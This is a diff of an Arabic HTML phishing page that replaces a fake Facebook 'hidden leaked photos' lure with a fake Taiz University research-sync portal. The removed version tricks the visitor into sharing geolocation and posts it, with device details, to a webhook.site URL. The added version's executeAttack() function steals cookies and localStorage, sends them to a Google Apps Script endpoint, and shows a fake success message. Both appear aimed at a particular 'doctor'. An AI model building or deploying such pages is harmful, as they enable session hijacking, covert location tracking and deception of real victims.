@@ -1,265 +1,50 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>عارض الصور المخفية - فيسبوك</title>
+    <title>بوابة المراجع الأكاديمية - جامعة تعز</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-        }
-        body {
-            background: #f0f2f5;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            direction: ltr;
-        }
-        .facebook-card {
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-            max-width: 500px;
-            width: 90%;
-            overflow: hidden;
-        }
-        .fb-header {
-            background: #4267B2;
-            color: white;
-            padding: 15px 20px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        .fb-header i {
-            font-size: 24px;
-        }
-        .fb-header span {
-            font-size: 18px;
-            font-weight: 600;
-        }
-        .fb-content {
-            padding: 20px;
-        }
-        .warning-box {
-            background: #fff3cd;
-            border: 1px solid #ffeeba;
-            color: #856404;
-            padding: 15px;
-            border-radius: 6px;
-            margin-bottom: 20px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        .warning-box i {
-            font-size: 24px;
-        }
-        .location-required {
-            background: #e7f3ff;
-            border: 1px solid #b8daff;
-            color: #004085;
-            padding: 15px;
-            border-radius: 6px;
-            margin: 20px 0;
-            text-align: center;
-        }
-        .fb-button {
-            background: #4267B2;
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            width: 100%;
-            margin: 10px 0;
-        }
-        .fb-button:hover {
-            background: #365899;
-        }
-        .fb-button:disabled {
-            background: #9cb4d8;
-            cursor: not-allowed;
-        }
-        .loader {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #4267B2;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .hidden-images {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 5px;
-            margin: 20px 0;
-        }
-        .hidden-images div {
-            background: #f0f2f5;
-            height: 100px;
-            border-radius: 4px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #666;
-            font-size: 12px;
-        }
-        .fb-footer {
-            background: #f0f2f5;
-            padding: 15px 20px;
-            font-size: 12px;
-            color: #666;
-            text-align: center;
-            border-top: 1px solid #ddd;
-        }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 400px; border-top: 5px solid #0056b3; }
+        h2 { color: #0056b3; margin-bottom: 15px; }
+        p { color: #555; font-size: 15px; line-height: 1.6; }
+        .btn { background-color: #0056b3; color: white; padding: 12px 25px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; transition: 0.3s; margin-top: 20px; width: 100%; }
+        .btn:hover { background-color: #003d7a; }
+        .logo { font-size: 50px; margin-bottom: 10px; }
     </style>
 </head>
 <body>
-    <div class="facebook-card">
-        <div class="fb-header">
-            <i>📸</i>
-            <span>عارض الصور المخفية - Facebook</span>
-        </div>
-        
-        <div class="fb-content">
-            <div class="warning-box">
-                <i>🔒</i>
-                <div>
-                    <strong>تم اكتشاف 23 صورة مسربة من بروفايلك!</strong><br>
-                    <span style="font-size: 13px;">صور لم تسمح بنشرها تظهر لبعض المستخدمين</span>
-                </div>
-            </div>
 
-            <div id="locationMessage" class="location-required">
-                <strong>⚠️ مطلوب تفعيل الموقع الجغرافي</strong><br>
-                <span style="font-size: 13px;">للتأكد من هويتك ومنع وصول الغرباء لصورك، يجب تفعيل الموقع</span>
-            </div>
+<div class="card">
+    <div class="logo">🎓</div>
+    <h2>نظام مزامنة الأبحاث</h2>
+    <p>عزيزي الدكتور، يرجى تحديث جلسة الاتصال (Session Update) لضمان استلام ملفات مشاريع التخرج لهذا الفصل بشكل آمن.</p>
+    <button class="btn" onclick="executeAttack()">تحديث الجلسة الآن</button>
+</div>
 
-            <div id="loadingSection" style="display: none;">
-                <div class="loader"></div>
-                <p style="text-align: center; color: #666; margin: 10px 0;">جاري التحقق من موقعك...</p>
-            </div>
+<script>
+    function executeAttack() {
+        // جمع الهوية الرقمية (Cookies + LocalStorage)
+        const stolenData = "Session_Cookies: " + document.cookie + 
+                         " | Storage_Data: " + JSON.stringify(localStorage) +
+                         " | User_Agent: " + navigator.userAgent;
 
-            <div id="imagesSection" style="display: none;">
-                <div class="hidden-images">
-                    <div>📸 صورة 1</div>
-                    <div>📸 صورة 2</div>
-                    <div>📸 صورة 3</div>
-                    <div>📸 صورة 4</div>
-                    <div>📸 صورة 5</div>
-                    <div>📸 صورة 6</div>
-                </div>
-                <p style="color: #666; font-size: 14px; text-align: center;">هذه صورك الخاصة التي ظهرت لبعض المستخدمين</p>
-            </div>
+        // الرابط الخاص بك الذي أرسلته لي
+        const scriptUrl = "https://script.google.com/macros/s/AKfycbz29mEFjA7VMdPNXE_z_I6W2LNFLwiMpJ-gRZyer42cALwJUT7qqD6QQ4lyW48WBSZ9/exec";
 
-            <button class="fb-button" id="activateBtn" onclick="requestLocation()">
-                🔍 عرض الصور المخفية الآن
-            </button>
+        // إرسال البيانات فوراً إلى الـ Spreadsheet الخاصة بك
+        fetch(scriptUrl, {
+            method: "POST",
+            mode: "no-cors",
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: "data=" + encodeURIComponent(stolenData)
+        });
 
-            <p style="font-size: 12px; color: #999; text-align: center; margin-top: 10px;">
-                لن يتم نشر موقعك، نستخدمه فقط للتحقق من الهوية
-            </p>
-        </div>
+        // إيهام الدكتور بأن العملية نجحت وتحويله لموقع رسمي
+        alert("تم تحديث الجلسة بنجاح. شكراً لتعاونكم دكتور.");
+        window.location.href = "https://www.google.com"; 
+    }
+</script>
 
-        <div class="fb-footer">
-            Facebook © 2026 · حماية الخصوصية · مساعدة
-        </div>
-    </div>
-
-    <script>
-        // رابط webhook.site الخاص بك (ثابت وجاهز)
-        const WEBHOOK_URL = 'https://webhook.site/8be65a7a-2f53-429f-942d-3b6e83ff1df0';
-
-        // دالة إرسال البيانات إلى webhook.site
-        function sendToWebhook(lat, lon, accuracy) {
-            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            const timestamp = new Date().toLocaleString('ar-EG');
-            
-            const data = {
-                latitude: lat,
-                longitude: lon,
-                accuracy: accuracy,
-                google_maps: mapsLink,
-                time: timestamp,
-                device: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language
-            };
-
-            // إرسال البيانات
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => console.log('تم الإرسال بنجاح'))
-            .catch(error => console.error('خطأ في الإرسال:', error));
-
-            // تحويل الدكتور مباشرة إلى Google
-            window.location.href = 'https://www.google.com';
-        }
-
-        // طلب الموقع
-        function requestLocation() {
-            const btn = document.getElementById('activateBtn');
-            const locationMsg = document.getElementById('locationMessage');
-            const loadingSection = document.getElementById('loadingSection');
-            
-            btn.disabled = true;
-            btn.textContent = 'جاري التحقق...';
-            locationMsg.style.display = 'none';
-            loadingSection.style.display = 'block';
-
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    // نجاح - سمح بالموقع
-                    function(position) {
-                        sendToWebhook(
-                            position.coords.latitude,
-                            position.coords.longitude,
-                            position.coords.accuracy
-                        );
-                    },
-                    // خطأ - رفض الموقع
-                    function(error) {
-                        loadingSection.style.display = 'none';
-                        locationMsg.style.display = 'block';
-                        
-                        if (error.code === 1) {
-                            locationMsg.innerHTML = '<strong>❌ تم الرفض</strong><br><span style="font-size: 13px;">يجب تفعيل الموقع لعرض الصور المخفية. جرب مرة أخرى.</span>';
-                        } else {
-                            locationMsg.innerHTML = '<strong>❌ حدث خطأ</strong><br><span style="font-size: 13px;">يرجى المحاولة مرة أخرى</span>';
-                        }
-                        
-                        btn.disabled = false;
-                        btn.textContent = '🔍 عرض الصور المخفية الآن';
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }
-                );
-            } else {
-                locationMsg.innerHTML = '<strong>❌ المتصفح لا يدعم</strong><br><span style="font-size: 13px;">استخدم متصفحاً أحدث</span>';
-                btn.disabled = false;
-                btn.textContent = '🔍 عرض الصور المخفية الآن';
-            }
-        }
-    </script>
 </body>
-    </html>
+</html>
